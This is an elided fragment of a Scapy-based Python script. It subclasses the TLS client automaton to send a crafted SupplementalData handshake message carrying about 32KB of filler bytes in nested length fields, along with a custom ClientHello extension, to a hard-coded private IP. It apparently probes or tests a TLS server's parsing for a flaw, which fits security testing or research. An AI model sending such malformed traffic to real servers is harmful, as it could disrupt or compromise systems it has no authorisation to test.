...
from scapy.layers.tls.handshake import TLSCertificate, TLSCertificateRequest, \
    ...
    _ASN1CertAndExt, TLS13KeyUpdate, TLS13NewSessionTicket, TLSSupplementalData
...
class TLSClientAutomaton(_TLSAutomaton):
    ...
    def should_add_ClientHello(self):
        if self.client_hello:
            ...
            ext.append(b"\x00\x06\x00\x02\x01\x40")#\x17\x00\x00")
            p.ext = ext
        self.add_msg(p)
    ...
    def PREPARE_CLIENTFLIGHT2(self):
        data=b"\x01"*0x7fff
        data2=b"\x00\x00"+len(data).to_bytes(2,'big')+data
        data3=(len(data2)).to_bytes(2,'big')+data2#+data_22
        data4=b"\x00\x00\x40"+data3
        suppdata=(len(data4)).to_bytes(4,'big')+data4
        self.add_record()
        self.add_msg(TLSSupplementalData(sdata=suppdata))
        self.flush_records()
        self.add_record()
    ...
    def should_add_ClientCertificate(self):
      ...
      #  test=b"\x17"+len(suppdata).to_bytes(3,'big')+suppdata
    #    pkt=b"\x16\x03\x01"+len(test).to_bytes(2,'big')+test
      #  self.add_record()
        #self.flush_records()
       # self.socket.send(pkt)
      #  self.buffer_out[-1].msg.append(b"\x16\x03\x01"+len(test).to_bytes(2,'big')+test)
        #self.add_msg(Raw(b"\x16\x03\x01"+len(test).to_bytes(2,'big')+test))
      #  self.flush_records()
       # self.add_record()
       # self.add_msg(TLS(pkt))
       # self.flush_records()
...
while l<1:
    ...
    l+=1
    try:
        t = TLSClientAutomaton(server="172.20.136.114", dport=443,
        version="tls12",server_name="bear.com",mycert="certificate.pem",mykey="private.key")
        t.run()
